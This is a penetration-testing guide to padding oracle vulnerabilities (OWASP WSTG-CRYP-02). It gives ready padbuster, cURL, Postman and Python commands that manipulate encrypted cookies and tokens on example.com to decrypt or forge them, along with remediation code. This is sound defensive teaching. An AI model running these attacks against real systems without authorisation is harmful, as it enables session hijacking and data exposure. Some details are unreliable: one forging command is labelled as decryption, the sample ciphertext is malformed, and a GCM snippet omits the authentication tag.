# **Testing for Padding Oracle**

## **Overview**

Testing for Padding Oracle (WSTG-CRYP-02) involves assessing web applications for vulnerabilities in block cipher padding schemes, particularly in CBC mode, that allow attackers to decrypt sensitive data or forge ciphertexts without the encryption key. According to OWASP, padding oracle vulnerabilities occur when a server inadvertently reveals whether padding in a modified ciphertext is valid through distinct error messages, status codes, or response times. This enables attackers to perform byte-by-byte decryption of encrypted data (e.g., session tokens, API parameters) or create valid ciphertexts, compromising confidentiality and integrity. This test focuses on identifying encrypted data, manipulating ciphertexts, and analyzing server responses to detect padding oracles.

**Impact**: Padding oracle vulnerabilities can lead to:
- Unauthorized decryption of sensitive data (e.g., user credentials, session IDs).
- Forgery of encrypted messages, bypassing authentication or authorization.
- Exposure of encrypted data in cookies, form fields, or API payloads.
- Escalation of attacks by chaining with other vulnerabilities (e.g., session hijacking).

This guide provides a practical, hands-on methodology for testing padding oracle vulnerabilities, adhering to OWASP’s WSTG-CRYP-02, with detailed tool setups, at least two specific commands or configurations per tool, real-world test cases, remediation strategies, and ethical considerations for professional penetration testing.

## **Testing Tools**

The following tools are recommended for testing padding oracle vulnerabilities, with at least two specific commands or configurations per tool for real security testing:

- **padbuster**: Automates padding oracle attacks to decrypt or forge ciphertexts.
- **Burp Suite Community Edition**: Intercepts and manipulates HTTP requests to test ciphertext responses.
- **cURL**: Sends modified ciphertexts to observe server behavior.
- **Postman**: Tests API endpoints with manipulated encrypted parameters.
- **Python Requests Library**: Scripts automated tests for padding oracle detection.

### **Tool Setup Instructions**

1. **padbuster**:
   - Install on Linux: `sudo apt install padbuster` or download from [GitHub](https://github.com/GDSSecurity/Padbuster).
   - Install Perl (dependency): `sudo apt install perl`.
   - Verify: `padbuster -h`.
2. **Burp Suite Community Edition**:
   - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
   - Configure browser proxy: 127.0.0.1:8080 (Firefox recommended).
   - Enable “Intercept” in Proxy tab.
   - Verify: `curl -x http://127.0.0.1:8080 http://example.com`.
3. **cURL**:
   - Install on Linux: `sudo apt install curl`.
   - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
   - Verify: `curl --version`.
4. **Postman**:
   - Download from [postman.com](https://www.postman.com/downloads/).
   - Install and create a free account.
   - Verify: Open Postman and check version.
5. **Python Requests Library**:
   - Install Python: `sudo apt install python3`.
   - Install Requests: `pip install requests`.
   - Verify: `python3 -c "import requests; print(requests.__version__)"`.

## **Testing Methodology**

This methodology follows OWASP’s black-box approach for WSTG-CRYP-02, focusing on identifying encrypted data, manipulating ciphertexts, and analyzing server responses to detect padding oracle vulnerabilities.

### **1. Identify Encrypted Data with Burp Suite**

Locate components containing encrypted data (e.g., cookies, URL parameters, form fields, API payloads).

**Steps**:
1. **Configure Burp Suite**:
   - Set up browser proxy (127.0.0.1:8080).
   - Add `example.com` to the target scope in the “Target” tab.
2. **Capture Requests**:
   - Browse the application or interact with APIs to capture requests in “HTTP History”.
   - Look for base64-encoded or hex strings in cookies (e.g., `session=abc123encrypted`), URL parameters (e.g., `?token=xyz`), or POST data.
3. **Analyze Data**:
   - Identify potential encrypted data by length (multiples of block size, e.g., 16 bytes for AES) or encoding (e.g., base64).
   - Note endpoints that process these values (e.g., `/api/auth`, `/profile`).
4. **Document Findings**:
   - Save requests with encrypted data in Burp Suite’s “Logger”.

**Burp Suite Commands**:
- **Command 1**: Capture and inspect a cookie:
  ```
  HTTP History -> Select GET /profile -> Check Request Headers for Cookie: session=abc123encrypted -> Copy value to Repeater
  ```
- **Command 2**: Test URL parameter:
  ```
  HTTP History -> Select GET /auth?token=xyz -> Send to Repeater -> Highlight token value for manipulation
  ```

**Example Encrypted Cookie**:
```
GET /profile HTTP/1.1
Host: example.com
Cookie: session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n
```

**Remediation**:
- Use authenticated encryption:
  ```python
  from cryptography.hazmat.primitives.ciphers.aead import AESGCM
  key = AESGCM.generate_key(bit_length=128)
  aesgcm = AESGCM(key)
  ciphertext = aesgcm.encrypt(nonce, data, associated_data)
  ```

### **2. Test for Padding Oracle with padbuster**

Use padbuster to automate padding oracle attacks and confirm vulnerabilities.

**Steps**:
1. **Identify Encrypted Value**:
   - Extract an encrypted value (e.g., base64-encoded cookie) from Burp Suite.
   - Ensure the value is a multiple of the block size (e.g., 16 bytes for AES).
2. **Run padbuster**:
   - Test the endpoint for padding oracle behavior by manipulating the ciphertext.
   - Specify the block size (typically 8 or 16 bytes) and encoding.
3. **Analyze Output**:
   - Check if padbuster identifies distinct responses (e.g., HTTP 200 vs. 403) for valid/invalid padding.
   - Attempt decryption if a vulnerability is confirmed.
4. **Document Findings**:
   - Save padbuster output and decrypted data (if any).

**padbuster Commands**:
- **Command 1**: Test for padding oracle in a cookie:
  ```bash
  padbuster http://example.com/profile 5a8b9c0d1e2f3g4h5i6j7k8l9m0n 16 -cookies "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" -encoding 0
  ```
- **Command 2**: Attempt decryption:
  ```bash
  padbuster http://example.com/profile 5a8b9c0d1e2f3g4h5i6j7k8l9m0n 16 -cookies "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" -encoding 0 -plaintext "test"
  ```

**Example Vulnerable Output**:
```
INFO: Valid padding found for block 1
Decrypted value: {"user_id": 123}
```

**Remediation**:
- Use GCM mode instead of CBC:
  ```python
  from cryptography.hazmat.primitives.ciphers.aead import AESGCM
  aesgcm = AESGCM(key)
  ciphertext = aesgcm.encrypt(nonce, plaintext, None)
  ```

### **3. Manipulate Ciphertexts with cURL**

Manually test for padding oracle by altering ciphertexts and observing server responses.

**Steps**:
1. **Extract Ciphertext**:
   - Copy an encrypted value (e.g., `token=xyz`) from Burp Suite.
2. **Modify Ciphertext**:
   - Alter a single byte (e.g., change one character in base64) and send the request.
   - Test multiple variations to identify response differences.
3. **Analyze Response**:
   - Check for distinct HTTP status codes (e.g., 200 vs. 403), error messages (e.g., `Invalid padding`), or timing differences.
   - A padding oracle exists if valid/invalid padding produces different responses.
4. **Document Findings**:
   - Save cURL commands and responses.

**cURL Commands**:
- **Command 1**: Test original ciphertext:
  ```bash
  curl -i -b "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" http://example.com/profile
  ```
- **Command 2**: Test modified ciphertext:
  ```bash
  curl -i -b "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0o" http://example.com/profile
  ```

**Example Vulnerable Response**:
- Original: `HTTP/1.1 200 OK`
- Modified: `HTTP/1.1 403 Forbidden: Invalid padding`

**Remediation**:
- Ensure consistent error messages:
  ```javascript
  app.use((err, req, res, next) => {
      res.status(400).json({ error: 'Invalid request' });
  });
  ```

### **4. Test API Endpoints with Postman**

Test API endpoints processing encrypted data for padding oracle vulnerabilities.

**Steps**:
1. **Identify API Endpoint**:
   - Use Burp Suite to find endpoints (e.g., `POST /api/auth`).
   - Import into Postman.
2. **Manipulate Encrypted Parameters**:
   - Alter encrypted values in request bodies or headers.
   - Send multiple variations.
3. **Analyze Response**:
   - Check for distinct error messages, status codes, or response times.
   - A padding oracle exists if responses differ based on padding validity.
4. **Document Findings**:
   - Save Postman requests and responses.

**Postman Commands**:
- **Command 1**: Send original encrypted token:
  ```
  New Request -> POST http://example.com/api/auth -> Body -> raw -> JSON: {"token": "5a8b9c0d1e2f3g4h5i6j7k8l9m0n"} -> Send
  ```
- **Command 2**: Send modified token:
  ```
  New Request -> POST http://example.com/api/auth -> Body -> raw -> JSON: {"token": "5a8b9c0d1e2f3g4h5i6j7k8l9m0o"} -> Send
  ```

**Example Vulnerable Response**:
```json
{
  "error": "Invalid padding in token"
}
```

**Remediation**:
- Use integrity checks:
  ```python
  from cryptography.hazmat.primitives.hmac import HMAC
  from cryptography.hazmat.primitives.hashes import SHA256
  hmac = HMAC(key, SHA256())
  hmac.update(ciphertext)
  hmac.verify(signature)
  ```

### **5. Automate Testing with Python Requests**

Script automated tests to detect padding oracle vulnerabilities by analyzing response differences.

**Steps**:
1. **Write Python Script**:
   - Create a script to send modified ciphertexts and compare responses:
     ```python
     import requests
     import base64

     url = 'http://example.com/profile'
     headers = {'Cookie': 'session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n'}
     original_response = requests.get(url, headers=headers)

     # Modify one byte
     modified_session = base64.b64decode('5a8b9c0d1e2f3g4h5i6j7k8l9m0n')
     modified_session = bytearray(modified_session)
     modified_session[-1] ^= 0x01
     modified_session = base64.b64encode(modified_session).decode()
     modified_headers = {'Cookie': f'session={modified_session}'}
     modified_response = requests.get(url, headers=modified_headers)

     print(f"Original: Status={original_response.status_code}, Content={original_response.text[:100]}")
     print(f"Modified: Status={modified_response.status_code}, Content={modified_response.text[:100]}")
     if original_response.status_code != modified_response.status_code:
         print("Potential padding oracle detected!")
     ```
2. **Run Script**:
   - Execute: `python3 test_padding_oracle.py`.
   - Analyze output for response differences.
3. **Verify Findings**:
   - Cross-check with padbuster or Burp Suite.
4. **Document Results**:
   - Save script output.

**Python Commands**:
- **Command 1**: Run the padding oracle test:
  ```bash
  python3 test_padding_oracle.py
  ```
- **Command 2**: Test multiple ciphertext variations:
  ```bash
  python3 -c "import requests; url='http://example.com/profile'; headers={'Cookie': 'session=5a8b9c0d1e2f3g4h5i6j7k8l9m0o'}; r=requests.get(url, headers=headers); print(r.status_code, r.text[:100])"
  ```

**Example Vulnerable Output**:
```
Original: Status=200, Content={"user_id": 123}
Modified: Status=403, Content={"error": "Invalid padding"}
Potential padding oracle detected!
```

**Remediation**:
- Avoid CBC mode:
  ```python
  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
  cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
  encryptor = cipher.encryptor()
  ciphertext = encryptor.update(data) + encryptor.finalize()
  ```

## **Real-World Test Cases**

These test cases extend OWASP’s WSTG-CRYP-02 with practical scenarios based on common padding oracle vulnerabilities observed in penetration testing.

### **Test 1: Padding Oracle in Encrypted Cookie**

**Objective**: Detect a padding oracle in an encrypted session cookie.

**Steps**:
1. **Capture Cookie**:
   - Use Burp Suite to extract `Cookie: session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n`.
2. **Run padbuster**:
   - Command:
     ```bash
     padbuster http://example.com/profile 5a8b9c0d1e2f3g4h5i6j7k8l9m0n 16 -cookies "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" -encoding 0
     ```
3. **Analyze Output**:
   - Check for valid padding detection or decrypted data.
   - Expected secure response: Consistent errors (e.g., `Invalid request`).
4. **Verify Manually**:
   - Command:
     ```bash
     curl -i -b "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0o" http://example.com/profile
     ```
5. **Save Results**:
   - Save padbuster output and cURL responses.

**Example Vulnerable Output**:
```
padbuster: Valid padding found for block 1
curl: HTTP/1.1 403 Forbidden: Invalid padding
```

**Remediation**:
```javascript
const crypto = require('crypto');
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
const ciphertext = cipher.update(data, 'utf8') + cipher.final();
```

### **Test 2: Padding Oracle in API Token**

**Objective**: Detect a padding oracle in an encrypted API token.

**Steps**:
1. **Capture Token**:
   - Use Burp Suite to find `POST /api/auth` with `{"token": "xyz"}`.
2. **Test in Postman**:
   - Command:
     ```
     New Request -> POST http://example.com/api/auth -> Body -> JSON: {"token": "xyz"} -> Send
     ```
   - Modify token (e.g., `xyy`) and resend.
3. **Analyze Response**:
   - Check for distinct status codes or error messages.
   - Expected secure response: Uniform error (e.g., `Invalid token`).
4. **Verify with padbuster**:
   - Command:
     ```bash
     padbuster http://example.com/api/auth xyz 16 -post '{"token": "{ENCRYPTED}"}' -encoding 0
     ```
5. **Save Results**:
   - Save Postman and padbuster outputs.

**Example Vulnerable Response**:
```json
{
  "error": "Padding error in token"
}
```

**Remediation**:
```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, plaintext, None)
```

### **Test 3: Padding Oracle in URL Parameter**

**Objective**: Detect a padding oracle in an encrypted URL parameter.

**Steps**:
1. **Capture Parameter**:
   - Use Burp Suite to find `GET /auth?token=xyz`.
2. **Test with cURL**:
   - Command:
     ```bash
     curl -i http://example.com/auth?token=xyz
     ```
   - Modify token: `curl -i http://example.com/auth?token=xyy`.
3. **Analyze Response**:
   - Check for response differences (e.g., HTTP 200 vs. 400).
   - Expected secure response: Consistent errors.
4. **Verify with Python**:
   - Run the Python script above.
5. **Save Results**:
   - Save cURL and Python outputs.

**Example Vulnerable Output**:
```
Original: HTTP/1.1 200 OK
Modified: HTTP/1.1 400 Bad Request: Invalid padding
```

**Remediation**:
```javascript
app.get('/auth', (req, res) => {
    try {
        const token = decrypt(req.query.token);
        res.json({ status: 'success' });
    } catch (e) {
        res.status(400).json({ error: 'Invalid token' });
    }
});
```

## **Additional Tips**

- **Identify All Encrypted Data**: Check cookies, URL parameters, form fields, and API payloads for potential ciphertexts.
- **Combine Tools**: Use Burp Suite for manual inspection, padbuster for automation, and Python for custom tests.
- **Gray-Box Testing**: If documentation is available, verify encryption modes (e.g., CBC vs. GCM) or error handling logic.
- **Document Thoroughly**: Save all commands, responses, and decrypted data in a report.
- **Ethical Considerations**: Obtain explicit permission for active testing, as padding oracle attacks may generate significant server load or expose sensitive data.
- **References**: [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html), [Padding Oracle Attack Explained](https://robertheaton.com/2013/07/29/padding-oracle-attack/).